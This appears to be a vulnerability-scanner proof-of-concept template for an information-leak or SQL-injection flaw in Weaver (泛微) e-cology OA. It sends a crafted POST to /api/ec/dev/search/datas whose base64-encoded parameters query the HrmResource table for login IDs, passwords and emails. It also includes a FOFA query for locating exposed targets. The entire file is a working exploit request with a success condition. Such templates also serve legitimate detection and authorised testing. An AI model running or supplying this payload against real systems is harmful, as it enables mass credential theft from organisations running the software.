id: poc-yaml-weaver-api-ec-dev-search-datas-information-leak
info:
  name: 泛微OA api-ec-dev-search-datas 信息泄露漏洞
  severity: high
  tags:
  - sql-injection
  finger: e-cology
  fofa: app="泛微-OA（e-cology）"
requests:
- method: POST
  path: /api/ec/dev/search/datas
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: type=&sqlParams={"tFields":"Kg==","tFrom":"SHJtUmVzb3VyY2U=","tOrder":"aWQ=","tWhere":""}&columns=[{"dataIndex":"loginid"},{"dataIndex":"password"},{"dataIndex":"email"},{"dataIndex":"id"}]&sumCloumns=&min=0&max=100
  expression: status_code == 200 && contains(body,"passwordspan") && contains(body,"password")
    && contains(body,"datas")
variables: {}
transport: http
